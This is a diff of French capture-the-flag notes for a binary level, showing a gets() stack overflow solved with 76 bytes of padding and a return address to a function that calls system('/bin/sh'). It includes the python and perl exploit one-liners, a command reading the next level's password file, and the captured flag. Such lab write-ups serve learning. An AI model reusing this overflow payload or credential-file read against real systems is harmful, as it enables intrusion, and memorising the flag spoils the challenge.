@@ -3,6 +3,7 @@ info functions
  => run 
 
 disas run => adresse : 0x08048444
+call system avec "/bin/sh"
 
 disas main :
 
@@ -14,23 +15,21 @@ Le gets charge la valeur recuperee sur l'entree standard dans eax
 Il faut donc charger 76 octets pour reecrire ebp et on y ajoute 4 octets pour ecrire une adresse sur eip
 
 
-b *0x08048495 (au niveau du leave, apres la declaration du buffer)
-
-i r (info registers)
-eax => 0xbffff6b0
-esp => 0xbffff6a0
-ebp => 0xbffff6f8
-eip => 0x8048495
-
    ebp    -   esp
 0xbffff6f8-0xbffff6a0 = 0x58 (88 octets)
 
 
-(perl -e 'print "A"x76 . "\x44\x84\x04\x08"' ; cat) | ./level1
-(python -c "print 'B' * 76 + '\x44\x84\x04\x08'" ; cat) | ./level1
+Avant le call gets : 
+
+$eax = $ebp - 80
 
 
-cd /home/user/level2
-ls -la
-cat .pass
+Commandes : 
+
+> (python -c "print 'B' * 76 + '\x44\x84\x04\x08'" ; cat) | ./level1
+> cat /home/user/level2/.pass
+
+
+Flag : 
+
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
